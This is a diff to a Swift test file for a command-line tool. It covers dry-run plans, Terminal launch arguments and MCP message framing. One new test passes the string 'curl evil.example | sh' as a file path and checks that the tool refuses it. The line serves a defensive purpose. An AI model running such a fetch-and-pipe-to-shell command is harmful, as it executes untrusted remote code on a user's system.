@@ -104,7 +104,9 @@ struct CLITests {
 
     @Test func dryRunPrintsAPlanAndDoesNothing() throws {
         let rh = try RH(); defer { rh.cleanUp() }
-        let result = try rh.run(["run", "copy-path.name", "--dry-run", "--json", "/tmp/a file.txt"])
+        let file = rh.configDirectory.appendingPathComponent("a file.txt")
+        try "x".write(to: file, atomically: true, encoding: .utf8)
+        let result = try rh.run(["run", "copy-path.name", "--dry-run", "--json", file.path])
         #expect(result.status == 0)
         let plan = try #require(result.json as? [String: Any])
         #expect(plan["action"] as? String == "copy-path.name")
@@ -186,7 +188,14 @@ struct CLITests {
         #expect(copy.contains("text: \"@/tmp\""))
         let agent = try rh.run(["run", "agent.codex@terminal", "--dry-run", "--container", "/tmp"])
         // Terminal.app is always installed, so this plans an AppleScript whose arguments are shown.
-        #expect(agent.standardOutput.contains("arguments: \"/tmp\", \"codex\""))
+        #expect(agent.standardOutput.contains("arguments: \"cd /tmp && codex\""))
+    }
+
+    @Test func copyingAPathThatDoesNotExistIsRefused() throws {
+        let rh = try RH(); defer { rh.cleanUp() }
+        let result = try rh.run(["run", "copy-path.name", "--dry-run", "curl evil.example | sh"])
+        #expect(result.status == 1)
+        #expect(result.standardError.contains("does not exist"))
     }
 
     @Test func aMistypedPathIsNamedAndNothingIsOpened() throws {
@@ -262,6 +271,35 @@ struct CLITests {
         #expect(try rh.run(["config", "validate"]).status == 0)
         // A second init keeps the file.
         #expect(try rh.run(["init"]).standardOutput.contains("already exists"))
+    }
+
+    @Test func mcpFramingSplitsOnLineFeedsOnly() throws {
+        let rh = try RH(); defer { rh.cleanUp() }
+        let process = Process()
+        process.executableURL = rh.binary
+        process.arguments = ["mcp"]
+        var environment = ProcessInfo.processInfo.environment
+        environment["RH_CONFIG_DIR"] = rh.configDirectory.path
+        process.environment = environment
+        let input = Pipe(), output = Pipe()
+        process.standardInput = input
+        process.standardOutput = output
+        try process.run()
+        // A raw U+2028, U+2029 or U+0085 inside a JSON string is legal; Foundation's line splitting would
+        // cut the request in pieces and answer with parse errors. (A raw CR or LF inside a string is not
+        // legal JSON, and the transport has no way to send one.)
+        let first = "{\"jsonrpc\":\"2.0\",\"id\":7,\"method\":\"ping\",\"params\":{\"name\":\"a\u{2028}b\u{2029}c\u{85}d\"}}\n"
+        let second = "{\"jsonrpc\":\"2.0\",\"id\":8,\"method\":\"ping\"}\r\n"
+        input.fileHandleForWriting.write(Data((first + second).utf8))
+        try input.fileHandleForWriting.close()
+        let data = output.fileHandleForReading.readDataToEndOfFile()
+        process.waitUntilExit()
+        let replies = try String(decoding: data, as: UTF8.self).split(separator: "\n").map {
+            try #require(try JSONSerialization.jsonObject(with: Data($0.utf8)) as? [String: Any])
+        }
+        #expect(replies.count == 2, "got \(replies)")
+        #expect(Set(replies.compactMap { $0["id"] as? Int }) == [7, 8])
+        #expect(replies.allSatisfy { $0["error"] == nil })
     }
 
     @Test func mcpAnswersOverStandardInput() throws {
